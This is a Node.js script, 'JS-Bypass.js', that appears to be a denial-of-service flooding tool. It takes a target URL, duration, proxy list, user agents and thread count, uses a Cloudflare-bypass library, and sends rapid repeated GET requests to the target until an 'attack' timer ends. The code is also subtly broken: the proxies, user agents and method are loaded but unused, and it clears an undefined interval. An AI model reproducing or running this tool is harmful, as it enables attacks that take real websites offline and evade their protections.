const EventEmitter = require('events');
var cloudscraper = require('cloudscraper');
var chalk = require('chalk');
var fs = require('fs');
var dateTime = require('node-datetime');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

const axios = require('axios');
const axiosCloudflare = require('axios-cloudflare');
 
axiosCloudflare(axios);

if(process.argv.length < 8)
{
    Logger("Wrong usage!");
    Logger("Usage: node JS-Bypass.js [URL] [TIME] [PROXY] [USERAGENTS] [METHOD] [THREADS]");
    process.exit(0);
}

var target = process.argv[2];
var time = process.argv[3];
var proxyFile = process.argv[4];
var useragentFile = process.argv[5];
var reqMethod = process.argv[6];
var threads = process.argv[7];

const userAgents = fs.readFileSync(useragentFile, 'utf-8').replace(/\r/g, '').split('\n');
const proxies = fs.readFileSync(proxyFile, 'utf-8').replace(/\r/g, '').split('\n');

setInterval(function() {

    setTimeout(() => {
        Logger("Attack has been finished.");
        process.exit(1);
    }, time * 1000);

    for (var i = 0; i < threads; i++) {
        let userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
         
        axios.get(target).then(response => {
            console.log(response.data);
        }).catch(error => {
            console.error(error);
        });
    }

}, 0);
setTimeout(() => clearInterval(int), time * 1000);

function Logger(string)
{
    var dt = dateTime.create();
    var formatted = dt.format('H:M:S');
    var log = console.log;
    log(chalk.yellow("[" + formatted + "] ") + chalk.blue(string));
}

process.on('uncaughtException', function(e) {
	// x)
});

process.on('unhandledRejection', function(e) {
	// x)
});